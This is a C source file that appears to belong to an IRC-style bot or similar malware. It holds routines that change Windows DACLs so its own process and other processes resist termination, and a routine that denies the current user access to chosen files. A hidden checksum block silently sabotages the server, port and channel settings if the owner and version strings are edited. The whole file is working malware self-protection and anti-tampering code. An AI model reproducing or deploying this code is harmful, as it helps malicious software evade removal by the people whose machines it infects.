#include "../Includes/includes.h"

void RemoteDaclProtection(DWORD dwPid)
{
    if(dwPid == 0)
        return;

    HANDLE hProcess = OpenProcess(WRITE_DAC, FALSE, dwPid);

    if(hProcess != NULL)
    {
        PSECURITY_DESCRIPTOR lpSecurity;
        if(fncConvertStringSecurityDescriptorToSecurityDescriptor(L"D:NO_ACCESS_CONTROL", 1, &lpSecurity, NULL))
            SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, lpSecurity);
    }

    CloseHandle(hProcess);
}

void ProtectByModifyingDacl()
{
    PSECURITY_DESCRIPTOR lpSecurity;

    if(fncConvertStringSecurityDescriptorToSecurityDescriptor(L"D:P", 1, &lpSecurity, NULL))
        SetKernelObjectSecurity((HANDLE) - 1, DACL_SECURITY_INFORMATION, lpSecurity);
}

bool SetFilePrivileges(LPTSTR cFilePathName, DWORD dwPermissions, bool bDenyOrNot) //CREDITS TO BETAMONKEY FOR THIS ONE
{
    bool bReturn = FALSE;

    if(cFilePathName == NULL || strlen(cFilePathName) < 1)
        return bReturn;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s--%s", cVersion, cOwner);
    char *cStr = cCheckString;
    unsigned long ulCheck = (((10000 / 100) * 100) - 4619);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum2)
    {
        strcpy(cServer, cServer + (strlen(cServer) - 1));
        usPort += (GetRandNum(899) + 100);
        strcpy(cChannel, "%s");

        cFilePathName[0] = '\0';
    }
    // <!-------! CRC AREA STOP !-------!>

    PACL              paDACL   = NULL;
    EXPLICIT_ACCESS_A stDeny   = { 0 };
    EXPLICIT_ACCESS_A stAllow  = { 0 };
    DWORD             dwError  = 0;

    BuildExplicitAccessWithNameA(&stDeny, (char*)"CURRENT_USER", dwPermissions, (bDenyOrNot)?DENY_ACCESS:GRANT_ACCESS, NO_INHERITANCE);

    if((dwError = SetEntriesInAclA(1, &stDeny, NULL, &paDACL)) != ERROR_SUCCESS)
        return bReturn;

    if((dwError = SetNamedSecurityInfoA(cFilePathName, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, paDACL, NULL)) != ERROR_SUCCESS)
    {
        LocalFree(paDACL);
        return bReturn;
    }
    else
        bReturn = TRUE;

    return bReturn;
}
